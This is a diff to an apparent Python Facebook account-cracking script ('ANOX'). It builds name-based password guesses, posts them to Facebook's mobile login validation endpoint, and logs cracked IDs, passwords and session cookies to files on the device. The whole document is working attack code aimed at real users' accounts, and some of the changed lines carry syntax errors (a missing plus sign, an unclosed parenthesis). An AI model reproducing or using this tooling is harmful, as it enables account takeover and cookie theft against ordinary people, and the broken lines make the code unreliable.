@@ -657,20 +657,18 @@ def passwrd():
                     pwv.append(nmf)
                     pwv.append(frs+'12')
                     pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
                 else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(nmf)
                     pwv.append('57273200')
+                    pwv.append('59039200')
+                    pwv.append(frs+'1234')
+                    pwv.append(nmf)
+                    pwv.append(frs'123')
                     pwv.append(frs+'@123')
                     pwv.append(frs+'@')
-                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@1234'
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
@@ -717,8 +715,7 @@ def crack(idf,pwv):
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;94m[ANOX-Cp] {idf} | {pw}')
-                os.system('espeak -a 300 " Cp,"')
-                open('/sdcard/cpfileanox.txt','a').write(idf+' | '+pw+'\n')
+                open('/sdcard/cpfileanox.txt','a').write(idf+'|'+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -728,7 +725,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;92m [ANOX-OK] {idf} | {pw}\n\033[0;93m | \033[0;92m{kuki} ')
                 os.system('espeak -a 300 " Tutul,  Ok,  id"')
-                open('/sdcard/anoxok.txt','a').write(idf+' | '+pw+' | '+kuki+'\n')
+                open('/sdcard/anoxok.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                 break
                 
             else:
@@ -760,7 +757,7 @@ def crackfree(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ANOX-Cp] {idf} | {pw}')
                 os.system('espeak -a 300 " Cp,"')
-                open('/sdcard/cpAnox.txt','a').write(idf+' • '+pw+'\n')
+                open('/sdcard/cpAnox.txt','a').write(idf+'•'+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
